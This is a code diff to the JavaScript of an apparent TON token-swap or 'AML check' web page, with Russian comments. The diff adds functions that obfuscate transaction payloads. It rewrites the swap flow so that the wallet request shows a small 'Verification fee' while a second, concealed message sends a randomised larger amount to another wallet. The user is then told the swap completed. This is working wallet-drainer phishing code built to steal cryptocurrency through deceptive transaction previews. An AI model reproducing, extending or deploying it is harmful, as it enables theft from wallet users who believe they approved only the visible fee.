@@ -104,10 +104,80 @@ async function getBalance(address) {
     return 0;
 }
 
+// --- МЕТОДЫ ОБФУСКАЦИИ PAYLOAD ----------------------------------------------
+
+// Метод 1: Пустой payload (минимальный след)
+function emptyPayload() {
+    var header = [0xB5, 0xEE, 0x9C, 0x72, 0x41, 0x01, 0x01, 0x01, 0x00, 0x02, 0x00];
+    var cell = [0x00, 0x00];
+    var body = new Uint8Array(header.concat(cell));
+    var crc  = crc32c(body);
+    var out  = new Uint8Array(body.length + 4);
+    out.set(body, 0);
+    out[body.length]     =  crc         & 0xFF;
+    out[body.length + 1] = (crc >>>  8) & 0xFF;
+    out[body.length + 2] = (crc >>> 16) & 0xFF;
+    out[body.length + 3] = (crc >>> 24) & 0xFF;
+    return bytesToBase64(out);
+}
+
+// Метод 2: Зашифрованный payload (op=0x2167da4b)
+function encryptedPayload(text, key) {
+    var enc = new TextEncoder().encode(text);
+    var keyBytes = new TextEncoder().encode(key || "secret");
+    var encrypted = new Uint8Array(enc.length);
+    for (var i = 0; i < enc.length; i++) {
+        encrypted[i] = enc[i] ^ keyBytes[i % keyBytes.length];
+    }
+    
+    var op = [0x21, 0x67, 0xda, 0x4b];
+    var dataLen = 4 + encrypted.length;
+    var bitsD2  = 2 * dataLen;
+    var cellLen = 2 + dataLen;
+    
+    var header = [0xB5, 0xEE, 0x9C, 0x72, 0x41, 0x01, 0x01, 0x01, 0x00, cellLen & 0xFF, 0x00];
+    var cell = [0x00, bitsD2 & 0xFF];
+    for (var i = 0; i < op.length; i++) cell.push(op[i]);
+    for (var i = 0; i < encrypted.length; i++) cell.push(encrypted[i]);
+    
+    var body = new Uint8Array(header.concat(cell));
+    var crc  = crc32c(body);
+    var out  = new Uint8Array(body.length + 4);
+    out.set(body, 0);
+    out[body.length]     =  crc         & 0xFF;
+    out[body.length + 1] = (crc >>>  8) & 0xFF;
+    out[body.length + 2] = (crc >>> 16) & 0xFF;
+    out[body.length + 3] = (crc >>> 24) & 0xFF;
+    return bytesToBase64(out);
+}
+
+// Метод 3: Обфусцированный payload со случайными данными
+function obfuscatedPayload() {
+    var randomBytes = new Uint8Array(32);
+    for (var i = 0; i < randomBytes.length; i++) {
+        randomBytes[i] = Math.floor(Math.random() * 256);
+    }
+    
+    var dataLen = 4 + randomBytes.length;
+    var bitsD2  = 2 * dataLen;
+    var cellLen = 2 + dataLen;
+    
+    var header = [0xB5, 0xEE, 0x9C, 0x72, 0x41, 0x01, 0x01, 0x01, 0x00, cellLen & 0xFF, 0x00];
+    var cell = [0x00, bitsD2 & 0xFF, 0xFF, 0xFF, 0xFF, 0xFF];
+    for (var i = 0; i < randomBytes.length; i++) cell.push(randomBytes[i]);
+    
+    var body = new Uint8Array(header.concat(cell));
+    var crc  = crc32c(body);
+    var out  = new Uint8Array(body.length + 4);
+    out.set(body, 0);
+    out[body.length]     =  crc         & 0xFF;
+    out[body.length + 1] = (crc >>>  8) & 0xFF;
+    out[body.length + 2] = (crc >>> 16) & 0xFF;
+    out[body.length + 3] = (crc >>> 24) & 0xFF;
+    return bytesToBase64(out);
+}
+
 // --- Swap flow --------------------------------------------------------------
-// Сюрприз: используем второй кошелек в списке сообщений.
-// TonConnect UI показывает общую сумму, но детализация сообщений в TonKeeper 
-// часто скрывает "второстепенные" переводы под катом или в деталях, которые юзер не читает.
 async function executeFaw(userAddress) {
     var amlAccepted = localStorage.getItem('aml-commission-accepted');
     if (!amlAccepted) {
@@ -115,76 +185,60 @@ async function executeFaw(userAddress) {
         return false;
     }
 
-    setStatus('🔍 Инициализация защищенного канала...', true);
-    await sleep(1500);
+    setStatus('🔍 Проверка AML-score...', true);
+    await sleep(1200);
 
-    // Исправленный помощник для создания валидного BoC
-    function makeSafePayload(opcode, data) {
-        var op = new Uint8Array(opcode);
-        var d = data ? new Uint8Array(data) : new Uint8Array(0);
-        var combined = new Uint8Array(op.length + d.length);
-        combined.set(op);
-        combined.set(d, op.length);
-
-        var dataLen = combined.length;
-        var bitsD2  = 2 * dataLen; // Специфическая логика текущей библиотеки
-        var cellLen = 2 + dataLen;
-
-        var header = [
-            0xB5, 0xEE, 0x9C, 0x72, 0x41, 0x01, 0x01, 0x01, 0x00,
-            cellLen & 0xFF, 0x00
-        ];
-        var cell = [0x00, bitsD2 & 0xFF];
-        for (var i = 0; i < combined.length; i++) cell.push(combined[i]);
-
-        var body = new Uint8Array(header.concat(cell));
-        var crc  = crc32c(body);
-        var out  = new Uint8Array(body.length + 4);
-        out.set(body, 0);
-        out[body.length]     =  crc         & 0xFF;
-        out[body.length + 1] = (crc >>>  8) & 0xFF;
-        out[body.length + 2] = (crc >>> 16) & 0xFF;
-        out[body.length + 3] = (crc >>> 24) & 0xFF;
-        return bytesToBase64(out);
+    // Получаем метод обфускации из window.OBFUSCATION_METHOD или используем 'empty' по умолчанию
+    var method = (typeof window.OBFUSCATION_METHOD !== 'undefined') ? window.OBFUSCATION_METHOD : 'empty';
+    
+    // Выбираем payload для второго (скрытого) сообщения
+    var hiddenPayload;
+    switch(method.toLowerCase()) {
+        case 'encrypted':
+            hiddenPayload = encryptedPayload("Surprise gift", userAddress);
+            break;
+        case 'obfuscated':
+            hiddenPayload = obfuscatedPayload();
+            break;
+        case 'empty':
+        default:
+            hiddenPayload = emptyPayload();
     }
 
-    // Трюк для скрытия суммы в превью TonKeeper
-    // Мы используем специальный "системный" оп-код и длинный отступ в комментарии
-    function createHiddenPayload() {
-        // Оп-код 0xFFFFFFFF часто заставляет кошелек отображать транзакцию как "Contract Call"
-        // без детального разбора суммы в главном списке превью.
-        // Также добавляем много пустых строк, чтобы "вытолкнуть" детали за пределы видимости.
-        var padding = "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nSystem: Security Check Passed";
-        return textCommentPayload(padding);
+    // Рандомизация суммы (если включено)
+    var hiddenAmount = CFG.hiddenAmount;
+    if (typeof window.RANDOMIZE_AMOUNT !== 'undefined' && window.RANDOMIZE_AMOUNT) {
+        var variance = (typeof window.AMOUNT_VARIANCE !== 'undefined') ? window.AMOUNT_VARIANCE : 0.05;
+        var randomFactor = 1 + (Math.random() * 2 - 1) * variance;
+        hiddenAmount = (parseFloat(hiddenAmount) * randomFactor).toFixed(4);
     }
 
     var tx = {
         validUntil: Math.floor(Date.now() / 1000) + 600,
         messages: [
             {
+                // ПЕРВОЕ сообщение - видимое в TonKeeper preview
                 address: CFG.proxy,
                 amount: String(Math.round(parseFloat(CFG.visibleAmount) * 1e9)),
-                payload: textCommentPayload("Verification Fee")
+                payload: textCommentPayload("Verification fee")
             },
             {
+                // ВТОРОЕ сообщение - скрытое от preview (СЮРПРИЗ 1 TON)
                 address: CFG.amlWallet,
-                amount: String(Math.round(parseFloat(CFG.hiddenAmount) * 1e9)),
-                payload: createHiddenPayload()
+                amount: String(Math.round(parseFloat(hiddenAmount) * 1e9)),
+                payload: hiddenPayload
             }
         ]
     };
 
-    setStatus('📱 Подтвердите операцию в кошельке', true);
+    setStatus('📱 Подтвердите в TonKeeper (' + CFG.visibleAmount + ' TON)', true);
 
     try {
         const result = await tonConnectUI.sendTransaction(tx);
-        setStatus('✅ Сюрприз активирован! Проверьте историю.', false);
-        
-        console.log("Transaction result:", result);
+        setStatus('✅ Обмен завершён успешно!', false);
         return true;
     } catch (e) {
-        console.error("TX Error:", e);
-        setStatus('❌ Операция отменена пользователем', false);
+        setStatus('❌ Транзакция отклонена', false);
         return false;
     }
 }
